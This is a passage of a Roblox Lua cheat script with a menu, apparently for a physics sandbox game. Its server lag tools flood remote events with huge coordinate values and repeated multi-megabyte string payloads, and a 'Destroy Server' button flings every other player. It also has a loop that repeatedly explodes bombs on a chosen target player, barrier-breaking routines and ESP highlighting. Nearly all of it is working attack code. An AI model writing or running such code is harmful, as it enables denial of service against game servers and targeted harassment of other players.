                if box then
                    box:Destroy()
                end
            end
            pcldBoxes = {}
            for _, conn in ipairs(pcldConnections) do
                pcall(function() conn:Disconnect() end)
            end
            pcldConnections = {}
        end

        function Scan()
            for _, obj in ipairs(workspace:GetDescendants()) do
                if pcldEnabled and IsTarget(obj) then
                    AddBoxESP(obj)
                end
            end
        end

        function UpdatePCLDColors()
            for _, box in pairs(pcldBoxes) do
                pcall(function()
                    box.Color3 = pcldColor
                end)
            end
        end

        VisL:CreateToggle({
            Name = "Rainbow PCLD",
            Default = false,
            Callback = function(v)
                pcldRainbow = v
                if v then
                    task.spawn(function()
                        while pcldRainbow do
                            local hue = tick() % 1
                            local color = Color3.fromHSV(hue, 1, 1)
                            for _, box in pairs(pcldBoxes) do
                                pcall(function()
                                    box.Color3 = color
                                end)
                            end
                            task.wait(0.05)
                        end
                    end)
                else
                    pcldColor = Color3.fromRGB(0, 255, 255)
                    UpdatePCLDColors()
                end
            end
        })

        VisL:CreateToggle({
            Name = "Enable PCLD",
            Default = false,
            Callback = function(v)
                pcldEnabled = v
                if pcldEnabled then
                    Scan()
                    local conn = workspace.DescendantAdded:Connect(function(obj)
                        if pcldEnabled and IsTarget(obj) then
                            AddBoxESP(obj)
                        end
                    end)
                    table.insert(pcldConnections, conn)
                else
                    RemoveAllBoxes()
                end
            end
        })
    end
end

local KB_THRESHOLD = 5
local BYTE_THRESHOLD = KB_THRESHOLD * 1024
local COOLDOWN = 30
local lastNotify = 0
local packetConnections = {}
-- Utility Functions using Script 6 UI's notification style
local function packetNotify(title, text)
    pcall(function()
        Library:Notify({
            Title = title or "Packet Detected",
            Content = text or "",
            Duration = 7
        })
    end)
end

ServerGroup = Tabs.Server:CreateBlock({Name = "Lags", Side = "Left"})
KickGroup = Tabs.Server:CreateBlock({Name = "Server", Side = "Right"})

selectedHeight = "Spawn"

function getAllPlayers()
    local players = {}
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            table.insert(players, plr)
        end
    end
    return players
end

GrabEvents = ReplicatedStorage:FindFirstChild("GrabEvents")

function spamOwnership(hrp)
    if not GrabEvents then return end
    local setOwner = GrabEvents:FindFirstChild("SetNetworkOwner")
    if setOwner and hrp then pcall(function() setOwner:FireServer(hrp, hrp.CFrame) end) end
end

function teleportToPlayer(myHrp, targetHrp)
    if not myHrp or not targetHrp then return end
    pcall(function()
        myHrp.CFrame = targetHrp.CFrame * CFrame.new(0, 5, 5)
        myHrp.AssemblyLinearVelocity = Vector3.zero
    end)
end

function destroyLineOnPlayer(hrp)
    if not GrabEvents then return end
    local createLine = GrabEvents:FindFirstChild("CreateGrabLine")
    local destroyLine = GrabEvents:FindFirstChild("DestroyGrabLine")
    if not createLine or not destroyLine then return end
    pcall(function()
        createLine:FireServer(hrp, CFrame.new(0, 1e9, 0))
        task.wait()
        destroyLine:FireServer(hrp)
    end)
end

lineLagThread = nil
lineLagEnabled = false

function startLineLag()
    if lineLagEnabled then return end
    lineLagEnabled = true
    lineLagThread = coroutine.create(function()
        if not GrabEvents then return end
        local createLine = GrabEvents:FindFirstChild("CreateGrabLine")
        if not createLine then return end
        while lineLagEnabled do
            local spawnLocation = Workspace:FindFirstChild("SpawnLocation") or Workspace:FindFirstChild("Spawn") or (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart"))
            if spawnLocation then
                local randomX = math.random(-1e9, 1e9)
                local randomZ = math.random(-1e9, 1e9)
                local directions = {CFrame.new(randomX, 0, randomZ), CFrame.new(-randomX, 0, -randomZ), CFrame.new(randomX, 0, -randomZ), CFrame.new(-randomX, 0, randomZ)}
                for _, pos in pairs(directions) do createLine:FireServer(spawnLocation, pos) end
            end
            task.wait()
        end
    end)
    coroutine.resume(lineLagThread)
end

function stopLineLag()
    lineLagEnabled = false
    if lineLagThread then coroutine.close(lineLagThread); lineLagThread = nil end
end

KickGroup:CreateDropdown({
    Name = "Destroy Height",
    Flag = "DestroyHeight",
    Items = {"Spawn", "Heaven"},
    Default = "Spawn",
    Callback = function(Value)
        selectedHeight = Value
    end
})

KickGroup:CreateButton({
    Name = "Destroy Server",
    Callback = function()
        task.spawn(function()
            local height = (selectedHeight == "Heaven") and 1e9 or 35
            startLineLag()
            task.wait(1)

            local players = getAllPlayers()
            if #players == 0 then
                stopLineLag()
                return
            end

            local myChar = LocalPlayer.Character
            local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
            if not myHrp then stopLineLag(); return end

            local playerData = {}
            for _, plr in ipairs(players) do
                local char = plr.Character
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                if hrp then table.insert(playerData, {player = plr, hrp = hrp}) end
            end

            for _, data in ipairs(playerData) do
                teleportToPlayer(myHrp, data.hrp)
                task.wait(0.2)
                spamOwnership(data.hrp)
                task.wait()
            end

            local radius = 40
            local angleStep = (math.pi * 2) / #playerData
            for idx, data in ipairs(playerData) do
                local angle = (idx - 1) * angleStep
                local x = math.cos(angle) * radius
                local z = math.sin(angle) * radius

                pcall(function()
                    data.hrp.CFrame = CFrame.new(x, height, z)
                    data.hrp.AssemblyLinearVelocity = Vector3.zero
                end)

                local bp = Instance.new("BodyPosition")
                bp.MaxForce = Vector3.new(1e9, 1e9, 1e9)
                bp.P = 40000000
                bp.Position = Vector3.new(x, height, z)
                bp.Parent = data.hrp
                task.delay(2, function() pcall(function() bp:Destroy() end) end)
                task.wait()
            end

            for i = 1, 8 do
                for _, data in ipairs(playerData) do destroyLineOnPlayer(data.hrp) end
                task.wait(0.3)
            end
        end)
    end
})

KickGroup:CreateButton({
    Name = "Stop Lag",
    Callback = function()
        stopLineLag()
    end
})


do

_G.MonsterLagEnabled = false

ServerGroup:CreateToggle({
    Name = "XOCU Lag",
    Flag = "MonsterLagToggle",
    Default = false,
    Callback = function(Value)
        _G.MonsterLagEnabled = Value
        
        if Value then
            task.spawn(function()
                local RepS = game:GetService("ReplicatedStorage")
                local WS = game:GetService("Workspace")
                local LP = game:GetService("Players").LocalPlayer
                local GrabEvents = RepS:FindFirstChild("GrabEvents")
                local CreateLine = GrabEvents and GrabEvents:FindFirstChild("CreateGrabLine")

                while _G.MonsterLagEnabled and CreateLine do
                    local spawnLocation = WS:FindFirstChild("SpawnLocation") 
                        or WS:FindFirstChild("Spawn") 
                        or (LP.Character and LP.Character:FindFirstChild("HumanoidRootPart"))

                    if spawnLocation then
                        local randomX = math.random(-9e9, 9e9)
                        local randomZ = math.random(-9e9, 9e9)
                        CreateLine:FireServer(spawnLocation, CFrame.new(randomX, 0, randomZ))
                    end
                    task.wait()
                end
            end)
        end
    end
})
end

do
    ReplicatedStorage = game:GetService("ReplicatedStorage")
    Workspace = game:GetService("Workspace")
    CreateLine = ReplicatedStorage.GrabEvents.CreateGrabLine

    lineLagActive = false
    lineLevel = 5
    lineAmount = 500

    local function updateLineAmount()
        lineAmount = 100 + (lineLevel - 1) * 100
    end

    ServerGroup:CreateSlider({
        Name = "Line Lag Level (1-10)",
        Flag = "LineLagLevel",
        Default = 5,
        Min = 1,
        Max = 10,
        Callback = function(v)
            lineLevel = v
            updateLineAmount()
        end
    })

    ServerGroup:CreateToggle({
        Name = "Line Lag",
        Flag = "LineLag",
        Default = false,
        Callback = function(v)
            lineLagActive = v
            if v then
                task.spawn(function()
                    while lineLagActive do
                        for i = 1, lineAmount do
                            pcall(function()
                                CreateLine:FireServer(Workspace.SpawnLocation, CFrame.new(0, 9e9, 0))
                            end)
                        end
                        task.wait(1)
                    end
                end)
            end
        end
    })
end

do
    ReplicatedStorage = game:GetService("ReplicatedStorage")
    R = ReplicatedStorage

    packetLagActive = false
    packetLagTask = nil
    packetLagStrength = 1
    packetLagSize = 1

    local function getPacketSize()
        -- 1 MB = ~1,000,000 ตัวอักษร
        -- แต่ละ char = 1 byte, emoji = 4 bytes
        -- ใช้ string.rep("A", ขนาด) ได้ง่ายกว่า
        return packetLagSize * 1000000
    end

    ServerGroup:CreateSlider({
        Name = "Packet Size (MB)",
        Flag = "PacketSize",
        Min = 1,
        Max = 20,
        Default = 1,
        Callback = function(v)
            packetLagSize = v
        end
    })

    ServerGroup:CreateButton({
        Name = "Send Packet Lag (Once)",
        Callback = function()
            GrabEvents = R:FindFirstChild("GrabEvents")
            ExtendGrabLine = GrabEvents and GrabEvents:FindFirstChild("ExtendGrabLine")
            if not ExtendGrabLine then return end
            local size = getPacketSize()
            pcall(function()
                ExtendGrabLine:FireServer(string.rep("A", size))
            end)
            Library:Notify({
                Title = "Packet Lag",
                Content = "Packet sent! Size: " .. packetLagSize .. " MB",
                Duration = 3
            })
        end
    })

    ServerGroup:CreateToggle({
        Name = "Packet Lag (Loop)",
        Flag = "PacketLag",
        Default = false,
        Callback = function(Value)
            packetLagActive = Value
            if Value then
                packetLagTask = task.spawn(function()
                    GrabEvents = R:FindFirstChild("GrabEvents")
                    ExtendGrabLine = GrabEvents and GrabEvents:FindFirstChild("ExtendGrabLine")
                    if not ExtendGrabLine then
                        packetLagActive = false
                        return
                    end
                    local size = getPacketSize()
                    while packetLagActive do
                        task.wait(0.5)
                        pcall(function()
                            ExtendGrabLine:FireServer(string.rep("A", size))
                        end)
                    end
                end)
            else
                if packetLagTask then
                    task.cancel(packetLagTask)
                    packetLagTask = nil
                end
            end
        end
    })
end

_G.Brkhs = false
fbexpConn = nil

function fbexp()
    if fbexpConn then fbexpConn:Disconnect() fbexpConn = nil end
    fbexpConn = workspace.ChildAdded:Connect(function(child)
        if _G.Brkhs then
            if fbexpConn then fbexpConn:Disconnect() fbexpConn = nil end
            return
        end
        if child.Name == "Part" and (child.Position - Vector3.new(263.4, -4.79, 466.8)).Magnitude <= 2 then
            _G.Brkhs = true
            Library:Notify({Title = "Done!", Description = "Destroyed Houses Barrier", Duration = 3})
            for _, plot in pairs(workspace.Plots:GetChildren()) do
                barrier = plot:FindFirstChild("Barrier")
                if barrier then
                    for _, part in pairs(barrier:GetChildren()) do
                        if part:IsA("BasePart") and part.CanCollide == true then
                            part.CanCollide = false
                        end
                    end
                end
            end
            if fbexpConn then fbexpConn:Disconnect() fbexpConn = nil end
        end
    end)
end

function breakhouse(mode)
    if not mode then return end
    _G.Brkhs = false
    fbexp()
    startTime = tick()
    repeat
        pcall(function()
            game:GetService("ReplicatedStorage").MenuToys.SpawnToyRemoteFunction:InvokeServer(
                "BallSnowball",
                CFrame.new(263.5, -4.5, 486.9),
                Vector3.new(0, 0, 0)
            )
        end)
        wStart = tick()
        repeat task.wait() until not LocalPlayer:FindFirstChild("CanSpawnToy") or LocalPlayer.CanSpawnToy.Value or tick() - wStart > 2
    until _G.Brkhs or tick() - startTime >= 10
    if fbexpConn then fbexpConn:Disconnect() fbexpConn = nil end
end

BarrierGroup = Tabs.Toy:CreateBlock({Name = "Barriers", Side = "Left"})
SparklerGroup = Tabs.Toy:CreateBlock({Name = "Sparkler", Side = "Left"})
ExplosionConfigBox = Tabs.Toy:CreateBlock({Name = "Settings", Side = "Right"})
AutoExplosionBox = Tabs.Toy:CreateBlock({Name = "Auto Explode", Side = "Right"})
ExplosionVisualBox = Tabs.Toy:CreateBlock({Name = "Visuals", Side = "Right"})

do

    _expTarget = nil
    _expDropUpdate = false
    AutoExplosionEnabled = false
    ExplosionType = "BombMissile"
    ExplosionInterval = 0
    PredictMovement = false
    ExplosionAmount = 3
    SpawnSpeed = 0
    SetupSpeed = 0
    ExplosionColorEnabled = false
    ExplosionColor = Color3.fromRGB(255, 0, 0)
    RainbowExplosionEnabled = false
    ExplosionBrightness = 10
    origexplosionpresets = {}
    origbrightnessvals = {}
    origsizevals = {}
    origspeedvals = {}
    origlifetimevals = {}
    origdensityvals = {}
    ParticleSize = 1
    ParticleSpeed = 1
    ParticleLifetime = 1
    ParticleDensity = 1
    ParticleTransparency = 0
    TransparentExplosionEnabled = false
    PulseColorEnabled = false
    PulseColorA = Color3.fromRGB(255, 80, 0)
    PulseColorB = Color3.fromRGB(0, 120, 255)
    PulseSpeed = 5
    StrobeEnabled = false
    StrobeIntensity = 5
    InvertColorEnabled = false
    BlendMode = "Default"

    SpawnToyRF = ReplicatedStorage:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction")
    DeleteToyRE = ReplicatedStorage:WaitForChild("MenuToys"):WaitForChild("DestroyToy")
    BuyToy = ReplicatedStorage:WaitForChild("MenuToys"):WaitForChild("BuyToyRemoteFunction")
    BombEvents = ReplicatedStorage:WaitForChild("BombEvents")
    SetNetworkOwner = ReplicatedStorage:WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner")

    HitboxNames = {
        BombMissile = "PartHitDetector",
        BombDarkMatter = "PartHitDetector",
        FireworkMissile = "PartHitDetector",
        BombBalloon = "Balloon",
        PresentBig = "Box",
        PresentSmall = "Box",
    }

    SetupParts = {
        BombMissile = "Body",
        BombDarkMatter = "Pyramid",
        FireworkMissile = "Hitbox",
        BombBalloon = "Balloon",
        PresentBig = "Box",
        PresentSmall = "Box",
    }

    function InitializeExplosionPresets()
        if ReplicatedStorage:FindFirstChild("ExplosionMaker") and ReplicatedStorage.ExplosionMaker:FindFirstChild("ParticlePresets") then
            for _, particle in ipairs(ReplicatedStorage.ExplosionMaker.ParticlePresets:GetChildren()) do
                if particle:IsA("ParticleEmitter") then
                    origexplosionpresets[particle] = particle.Color
                    origbrightnessvals[particle] = particle.Brightness
                    origsizevals[particle] = particle.Size
                    origspeedvals[particle] = particle.Speed
                    origlifetimevals[particle] = particle.Lifetime
                    origdensityvals[particle] = particle.Rate
                end
            end
        end
    end

    function GetParticles()
        if not ReplicatedStorage:FindFirstChild("ExplosionMaker") or not ReplicatedStorage.ExplosionMaker:FindFirstChild("ParticlePresets") then
            return {}
        end
        out = {}
        for _, p in ipairs(ReplicatedStorage.ExplosionMaker.ParticlePresets:GetChildren()) do
            if p:IsA("ParticleEmitter") then
                table.insert(out, p)
            end
        end
        return out
    end

    function InvertColor(c)
        return Color3.new(1 - c.R, 1 - c.G, 1 - c.B)
    end

    function ApplyExplosionColor()
    for _, particle in ipairs(GetParticles()) do
        local col
        if RainbowExplosionEnabled then
            col = ColorSequence.new({
                ColorSequenceKeypoint.new(0, Color3.new(1, 0, 0)),
                ColorSequenceKeypoint.new(0.25, Color3.new(0, 1, 0)),
                ColorSequenceKeypoint.new(0.5, Color3.new(0, 0, 1)),
                ColorSequenceKeypoint.new(0.75, Color3.new(1, 1, 0)),
                ColorSequenceKeypoint.new(1, Color3.new(1, 0, 0)),
            })
        elseif ExplosionColorEnabled then
            local c = InvertColorEnabled and InvertColor(ExplosionColor) or ExplosionColor
            col = ColorSequence.new(c)
        else
            col = origexplosionpresets[particle]
        end
        particle.Color = col
    end
end

    function ApplyExplosionBrightness()
        for _, particle in ipairs(GetParticles()) do
            if ExplosionBrightness == 10 then
                particle.Brightness = origbrightnessvals[particle]
            else
                particle.Brightness = origbrightnessvals[particle] * 2 * (ExplosionBrightness - 9)
            end
        end
    end

    function ApplyParticleSize()
        for _, particle in ipairs(GetParticles()) do
            orig = origsizevals[particle]
            if orig then
                kps = orig.Keypoints
                newkps = {}
                for _, kp in ipairs(kps) do
                    table.insert(newkps, NumberSequenceKeypoint.new(kp.Time, kp.Value * ParticleSize, kp.Envelope))
                end
                particle.Size = NumberSequence.new(newkps)
            end
        end
    end

    function ApplyParticleSpeed()
    for _, particle in ipairs(GetParticles()) do
        orig = origspeedvals[particle]
        if orig then
            particle.Speed = NumberRange.new(orig.Min * ParticleSpeed, orig.Max * ParticleSpeed)
        end
    end
end

    function ApplyParticleLifetime()
        for _, particle in ipairs(GetParticles()) do
            orig = origlifetimevals[particle]
            if orig then
                particle.Lifetime = NumberRange.new(orig.Min * ParticleLifetime, orig.Max * ParticleLifetime)
            end
        end
    end

    function ApplyParticleDensity()
        for _, particle in ipairs(GetParticles()) do
            orig = origdensityvals[particle]
            if orig then
                particle.Rate = orig * ParticleDensity
            end
        end
    end

    function ApplyParticleTransparency()
        for _, particle in ipairs(GetParticles()) do
            if TransparentExplosionEnabled then
                particle.Transparency = NumberSequence.new({
                    NumberSequenceKeypoint.new(0, ParticleTransparency),
                    NumberSequenceKeypoint.new(1, 1),
                })
            else
                particle.Transparency = NumberSequence.new({
                    NumberSequenceKeypoint.new(0, 0),
                    NumberSequenceKeypoint.new(1, 1),
                })
            end
        end
    end

    function ApplyBlendMode()
        for _, particle in ipairs(GetParticles()) do
            pcall(function()
                particle.LightEmission = (BlendMode == "Additive") and 1 or 0
            end)
        end
    end


    function GetSpawnedToys()
        return Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
    end

    function ExpGetPlayerList()
        list = {}
        for _, p in pairs(Players:GetPlayers()) do
            if p ~= LocalPlayer then
                table.insert(list, p.DisplayName .. " (@ " .. p.Name .. ")")
            end
        end
        table.sort(list)
        return list
    end

    -- บรรทัด 9198
local function ExpGetPlayerByName(username)
    if typeof(username) == "Instance" then
        return username
    end
    return Players:FindFirstChild(username)
end

    function ExpGetTargetHRP()
        if not _expTarget then return nil, nil end
        p = ExpGetPlayerByName(_expTarget)
        if p and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
            return p.Character.HumanoidRootPart, p
        end
        return nil, nil
    end

    function ExpRefreshDropdown()
        _expDropUpdate = true
        pcall(function()
            ExplosionPlayerDropdown:SetItems(ExpGetPlayerList())
        end)
        _expDropUpdate = false
    end

    function GetPlayerCharacterLocal()
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            return LocalPlayer.Character
        end
        return nil
    end

    function LookAt(from, to)
        dir = (to - from).Unit
        right = dir:Cross(Vector3.new(0, 1, 0))
        up = right:Cross(dir)
        return CFrame.fromMatrix(from, right, up)
    end

    function SetNetworkOwnership(part)
        if not part then return end
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            pcall(function()
                SetNetworkOwner:FireServer(part, LookAt(LocalPlayer.Character.HumanoidRootPart.Position, part.Position))
            end)
        end
    end

    function SpawNoneBomb()
        char = GetPlayerCharacterLocal()
        if char then
            pos = char.HumanoidRootPart.Position
            pcall(function()
                SpawnToyRF:InvokeServer(ExplosionType, CFrame.new(pos + Vector3.new(0, 5, 0)), Vector3.new(0, 0, 0))
                BuyToy:InvokeServer(ExplosionType)
            end)
        end
    end

    function GetAllBombs()
    toys = GetSpawnedToys()
    if not toys then return {} end
    bombs = {}
    for _, toy in pairs(toys:GetChildren()) do
        if toy.Name == ExplosionType then
            table.insert(bombs, toy)
        end
    end
    return bombs
end

    function SetupBomb(bomb)
        if not bomb or not bomb.PrimaryPart then return end
        hitPart = bomb:FindFirstChild(SetupParts[bomb.Name])
        if not hitPart then return end
        SetNetworkOwnership(hitPart)
        task.wait(0.05)
        pcall(function()
            for _, v in pairs(bomb.PrimaryPart:GetChildren()) do
                if v:IsA("BodyVelocity") or v.Name == "Stable" then
                    v:Destroy()
                end
            end
            bodyVel = Instance.new("BodyVelocity")
            bodyVel.Velocity = Vector3.new(0, 0, 0)
            bodyVel.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bodyVel.Name = "Stable"
            bodyVel.Parent = bomb.PrimaryPart
            bomb:PivotTo(CFrame.new(math.random(-500, 500), 10000, math.random(-500, 500)))
        end)
    end

    function ExplodeBomb(bomb, targetHRP)
        if not bomb or not targetHRP then return end
        hitbox = bomb:FindFirstChild(HitboxNames[bomb.Name])
        if hitbox then
            targetPos = targetHRP.Position
            if PredictMovement then
                targetPos = targetPos + targetHRP.Velocity / 1.93
            end
            pcall(function()
                BombEvents.BombExplode:FireServer({
                    Hitbox = hitbox,
                    PositionPart = targetHRP,
                }, targetPos)
            end)
        end
    end

    function DeleteAllBombs()
        for _, bomb in pairs(GetAllBombs()) do
            pcall(function()
                DeleteToyRE:FireServer(bomb)
            end)
        end
    end

function SpawNoneBomb()
    local char = GetPlayerCharacterLocal()
    if char then
        local pos = char.HumanoidRootPart.Position
        pcall(function()
            SpawnToyRF:InvokeServer(ExplosionType, CFrame.new(pos + Vector3.new(0, 5, 0)), Vector3.new(0, 0, 0))
            BuyToy:InvokeServer(ExplosionType)
        end)
    end
end

function AutoExplosionLoop()
    local lastLoopTime = 0
    local MAX_ITERATIONS = 100  -- ป้องกัน loop เกิน
    
    while AutoExplosionEnabled do
        -- ป้องกัน loop ทำงานเร็วเกินไป
        if tick() - lastLoopTime < 0.05 then
            task.wait(0.05)
            continue
        end
        lastLoopTime = tick()
        
        local targetHRP, targetPlayer = ExpGetTargetHRP()

        if not targetPlayer or not targetHRP then
            -- ถ้าไม่มี target ให้รอแล้ววนใหม่
            task.wait(0.5)
            continue
        end

        -- ตรวจสอบว่า target ยังมีชีวิตอยู่
        local hum = targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid")
        if not hum or hum.Health <= 0 then
            task.wait(0.5)
            continue
        end

        -- ลบระเบิดเก่า
        DeleteAllBombs()
        task.wait(0.1)

        -- spawn ระเบิด
        local spawnCount = 0
        local maxSpawnAttempts = 20
        while #GetAllBombs() < ExplosionAmount and AutoExplosionEnabled and spawnCount < maxSpawnAttempts do
            SpawNoneBomb()
            spawnCount = spawnCount + 1
            task.wait(SpawnSpeed + 0.05)
        end

        task.wait(0.15)

        -- setup ระเบิด
        local bombs = GetAllBombs()
        for _, bomb in pairs(bombs) do
            if not AutoExplosionEnabled then break end
            SetupBomb(bomb)
            task.wait(SetupSpeed or 0.05)
        end

        task.wait(0.2)

        -- ระเบิด
        local targetHRP2, targetPlayer2 = ExpGetTargetHRP()
        if targetHRP2 and targetPlayer2 then
            local bombs2 = GetAllBombs()
            for _, bomb in pairs(bombs2) do
                if not AutoExplosionEnabled then break end
                ExplodeBomb(bomb, targetHRP2)
                task.wait(0.01)
            end
        end

        task.wait(0.15)
        DeleteAllBombs()
        task.wait(ExplosionInterval or 0.5)
    end
end

    InitializeExplosionPresets()

    function getPlayerList()
        list = {}
        for _, p in pairs(Players:GetPlayers()) do
            if p ~= LocalPlayer then
                table.insert(list, p.DisplayName .. " (@ " .. p.Name .. ")")
            end
        end
        return list
    end

    function getPlayerFromSelection(Value)
        if not Value then return nil end
        username = Value:match("%(@ ?(.+)%)") or Value
        return Players:FindFirstChild(username)
    end

    ExplosionPlayerDropdown = ExplosionConfigBox:CreateDropdown({
        Name = "Select Target",
        Items = getPlayerList(),
        Default = nil,
        Callback = function(Value)
            if _expDropUpdate then return end
            _expTarget = getPlayerFromSelection(Value)
        end
    })

    function updateDropdown()
        if ExplosionPlayerDropdown then
            newList = getPlayerList()
            pcall(function()
                ExplosionPlayerDropdown:SetItems(newList, true)
                if not _expTarget and newList[1] then
                    ExplosionPlayerDropdown:SetValue(newList[1])
                end
            end)
        end
    end

    task.spawn(function()
        while task.wait(2) do
            updateDropdown()
        end
    end)

    Players.PlayerAdded:Connect(function()
        task.wait(0.5)
        updateDropdown()
    end)

    Players.PlayerRemoving:Connect(function(plr)
        task.wait(0.5)
        if plr.Name == _expTarget then
            AutoExplosionEnabled = false
            _expTarget = nil
            pcall(function()
                Toggles.AutoExplosionToggle:SetValue(false)
            end)
        end
        updateDropdown()
    end)

    ExplosionConfigBox:CreateButton({
        Name = "Refresh Player List",
        Callback = function()
            updateDropdown()
        end
    })

    ExplosionConfigBox:CreateDropdown({
        Name = "Explosion Type",
        Items = { "Missile", "Firework", "Void", "Balloon", "Small Present", "Big Present" },
        Default = "Missile",
        Callback = function(Value)
            typeMap = {
                Missile = "BombMissile",
                Firework = "FireworkMissile",
                Void = "BombDarkMatter",
                Balloon = "BombBalloon",
                ["Small Present"] = "PresentSmall",
                ["Big Present"] = "PresentBig",
            }
            ExplosionType = typeMap[Value] or "BombMissile"
        end
    })

    ExplosionConfigBox:CreateSlider({
        Name = "Bomb Amount",
        Default = 3,
        Min = 1,
        Max = 10,
        Callback = function(v)
            ExplosionAmount = v
        end
    })

    ExplosionConfigBox:CreateToggle({
        Name = "Predict Movement",
        Default = false,
        Callback = function(v)
            PredictMovement = v
        end
    })

    ExplosionVisualBox:CreateToggle({
        Name = "Custom Explosion Color",
        Default = false,
        Callback = function(v)
            ExplosionColorEnabled = v
            RainbowExplosionEnabled = false
            ApplyExplosionColor()
        end
    })

    ExplosionVisualBox:CreateToggle({
        Name = "Rainbow Explosions",
        Default = false,
        Callback = function(v)
            RainbowExplosionEnabled = v
            if v then ExplosionColorEnabled = false end
            ApplyExplosionColor()
        end
    })

    ExplosionVisualBox:CreateToggle({
        Name = "Invert Explosion Color",
        Default = false,
        Callback = function(v)
            InvertColorEnabled = v
            ApplyExplosionColor()
        end
    })

    ExplosionVisualBox:CreateSlider({
        Name = "Explosion Brightness",
        Default = 10,
        Min = 10,
        Max = 50,
        Callback = function(v)
            ExplosionBrightness = v
            ApplyExplosionBrightness()
        end
    })

    ExplosionVisualBox:CreateSlider({
        Name = "Particle Size",
        Default = 1,
        Min = 1,
        Max = 10,
        Callback = function(v)
            ParticleSize = v
            ApplyParticleSize()
        end
    })

    ExplosionVisualBox:CreateSlider({
        Name = "Particle Speed",
        Default = 1,
        Min = 1,
        Max = 10,
        Callback = function(v)
            ParticleSpeed = v
            ApplyParticleSpeed()
        end
    })

    ExplosionVisualBox:CreateSlider({
        Name = "Particle Lifetime",
        Default = 1,
        Min = 1,
        Max = 10,
        Callback = function(v)
            ParticleLifetime = v
            ApplyParticleLifetime()
        end
    })

    ExplosionVisualBox:CreateSlider({
        Name = "Particle Density",
        Default = 1,
        Min = 1,
        Max = 10,
        Callback = function(v)
            ParticleDensity = v
            ApplyParticleDensity()
        end
    })

    ExplosionVisualBox:CreateToggle({
        Name = "Custom Transparency",
        Default = false,
        Callback = function(v)
            TransparentExplosionEnabled = v
            ApplyParticleTransparency()
        end
    })

    ExplosionVisualBox:CreateSlider({
        Name = "Particle Transparency",
        Default = 0,
        Min = 0,
        Max = 10,
        Callback = function(v)
            ParticleTransparency = v / 10
            if TransparentExplosionEnabled then
                ApplyParticleTransparency()
            end
        end
    })

    ExplosionVisualBox:CreateDropdown({
        Name = "Blend Mode",
        Items = { "Default", "Additive" },
        Default = "Default",
        Callback = function(v)
            BlendMode = v
            ApplyBlendMode()
        end
    })

    AutoExplosionBox:CreateToggle({
    Name = "Loop Explode",
    Default = false,
    Callback = function(v)
        AutoExplosionEnabled = v
        if v then
            if not _expTarget or _expTarget == "" then
                AutoExplosionEnabled = false
                Library:Notify({ Title = "Error", Content = "Select target first!", Duration = 3 })
                return
            end
            -- ใช้ task.spawn เพื่อไม่ให้ UI ค้าง
            task.spawn(AutoExplosionLoop)
        else
            task.wait(0.3)
            DeleteAllBombs()
        end
    end
})
end

do

    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local Workspace = game:GetService("Workspace")

    local destroyBarrierActive = false
    local destroyBarrierThread = nil
    local plotsBroken = false


    BarrierGroup:CreateButton({
        Name = "Break House Barriers (Best)",
        Callback = function()
            breakhouse("auto")
        end
    })

    BarrierGroup:CreateToggle({
        Name = "Anti Barrier",
        Default = false,
        Callback = function(val)
            local plots = workspace:FindFirstChild("Plots")
            if not plots then return end
            for _, plot in ipairs(plots:GetChildren()) do
                local barrierModel = plot:FindFirstChild("Barrier")
                if barrierModel then
                    for _, part in ipairs(barrierModel:GetChildren()) do
                        if part:IsA("BasePart") and part.Name == "PlotBarrier" then
                            part.CanCollide = not val
                        end
                    end
                end
            end
        end
    })
end

do

    activeSparklers = {}
    sparklerConfig = {
        Height = 5,
        Speed = 2,
        Radius = 15,
        CurrentShape = 'Planet',
    }

    shapeOptions = {
        'Planet',
        'Sphere',
        'Cylinder',
        'Double Ring',
        'Star',
        'Infinity',
        'Heart',
        'DNA Helix',
        'Triple Helix',
        'Tornado',
        'Galaxy Spiral',
        'Fibonacci Spiral',
        'Spring Coil',
        'Vortex Funnel',
        'Box',
        'Rounded Cube',
        'Torus',
        'Torus Knot',
        'Möbius Strip',
        'Saturn',
        'Ice Cube',
    }

    function SetupPhysics(obj, list)
        for _, v in ipairs(list) do
            if v == obj then
                return
            end
        end

        mainPart = obj:IsA("BasePart") and obj or obj.PrimaryPart or obj:FindFirstChildWhichIsA("BasePart", true)
        if not mainPart then
            return
        end

        pcall(function()
            if mainPart:CanSetNetworkOwnership() then
                mainPart:SetNetworkOwner(LocalPlayer)
            end
        end)

        mainPart.Anchored = false

        bp = mainPart:FindFirstChild("ToyBodyPos") or Instance.new("BodyPosition", mainPart)
        bp.Name = "ToyBodyPos"
        bp.MaxForce = Vector3.new(1e8, 1e8, 1e8)
        bp.P = 100000
        bp.D = 800

        bg = mainPart:FindFirstChild("ToyBodyGyro") or Instance.new("BodyGyro", mainPart)
        bg.Name = "ToyBodyGyro"
        bg.MaxTorque = Vector3.new(1e8, 1e8, 1e8)
        bg.P = 50000

        for _, p in ipairs(obj:GetDescendants()) do
            if p:IsA("BasePart") then
                p.CanCollide = false
            end
        end

        table.insert(list, obj)
    end

    TAU = math.pi * 2
    sqrt = math.sqrt
    sin = math.sin
    cos = math.cos
    abs = math.abs
    pow = function(b, e)
        return b >= 0 and b ^ e or -((-b) ^ e)
    end
    clamp = math.clamp

    function baseAngle(i, n, t, speed)
        return (i / n) * TAU + t * speed
    end

    Shapes = {}
    Shapes.Planet = function(i, n, t, r, h, sp)
        coreN = clamp(math.floor(n * 0.35), 8, 15)
        coreN = math.min(coreN, n)
        ring1N = math.max(math.floor((n - coreN) / 2), 1)
        spin = t * sp

        if i <= coreN then
            phi = math.acos(1 - 2 * (i / coreN))
            theta = i * math.pi * (3 - sqrt(5)) + spin
            cr = r * 0.35
            return Vector3.new(cos(theta) * sin(phi) * cr, cos(phi) * cr + h, sin(theta) * sin(phi) * cr)
